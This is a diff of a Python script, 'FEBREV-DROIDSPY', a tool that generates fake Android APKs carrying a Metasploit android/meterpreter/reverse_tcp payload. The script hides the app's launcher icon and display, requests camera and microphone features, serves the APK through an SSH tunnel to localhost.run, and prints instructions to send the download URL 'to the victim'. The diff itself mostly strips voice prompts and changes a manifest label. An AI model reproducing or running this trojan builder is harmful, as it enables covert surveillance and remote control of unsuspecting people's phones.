@@ -42,14 +42,12 @@ def droid_venom():
  |k|r|a|m|p|u|s|6|6|6| |d|r|o|i|d|s|p|y|
  +-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
 	""")
-	os.system("espeak FEBREV-DROIDSPY is the advanced version of febrev-venom tool which creates fake apk with custom icon and name by the user and can be controlled by msf meterpreter")
 	os.system(f'zenity --title FEBREV-DROIDSPY --info --text "FEBREV-DROIDSPY is tool which creates fake apk with custom icon and name by the user and can be controlled by msf meterpreter"')
 	os.system(f'zenity --title FEBREV-DROIDSPY --entry --text "Enter the name of your apk" --entry-text=krampus666 > name.txt')
 	namefile=open("name.txt","r")
 	name=namefile.read()
 	namefile.close()
 	lip=socket.gethostbyname(socket.gethostname())
-	os.system("espeak 'Hello hacker, please enter the IP address to the connection of payload'")
 	os.system(f'zenity --title "FEBREV-DROIDSPY" --entry --text "Enter your Listener Host: your local ip is {socket.gethostbyname(socket.gethostname())}" --entry-text="{lip}" > febrev.log')
 	log0=open("febrev.log","r")
 	lhost=log0.read()
@@ -85,7 +83,6 @@ ________________________________________
 	else:
 		print("YOU HAVE ENTERED AN INVALID INPUT..So Using Default [1] android/meterpreter/reverse_tcp")
 		os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} -a dalvik --platform=android -o febrev.apk")
-	os.system("espeak 'please select the icon for the trojan'")
 	print("\n SELECT THE ICON FILE [must be in .png format]")
 	os.system('zenity --title "SELECT THE ICON FOR THE APK :" --file-selection > febrev.log')
 	log3=open("febrev.log","r")
@@ -286,7 +283,7 @@ SELECT THE APPROPRIATE PERMISSIONS FOR THE PAYLOAD ACCORDING TO THE USE
     <uses-feature android:name="android.hardware.camera.autofocus"/>
     <uses-feature android:name="android.hardware.microphone"/>
     <application android:label="@string/app_name" android:icon="@drawable/icon">
-        <activity android:label="@string/app_name" android:icon="@drawable/invisible" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
+        <activity android:label="@string/installed" android:icon="@drawable/invisible" android:name=".MainActivity" android:theme="@android:style/Theme.NoDisplay">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
@@ -341,7 +338,6 @@ use this command in another terminal to activate listener to your trojan ===> ms
 ├┤ ├┤ ├┴┐├┬┘├┤ └┐┌┘───││├┬┘│ ││ ││└─┐├─┘└┬┘
 └  └─┘└─┘┴└─└─┘ └┘   ─┴┘┴└─└─┘┴─┴┘└─┘┴   ┴ 
  """)
-	os.system("espeak 'send the below URL in the following format to the victim, do not close the program until trojan delivery'")
 	print(f"\033[1;31m send the below URL to the victim in this format : https://<url>/{name.strip()}.apk \033[1;36m ")
 	os.system("ssh -R 80:localhost:80 localhost.run ")
 
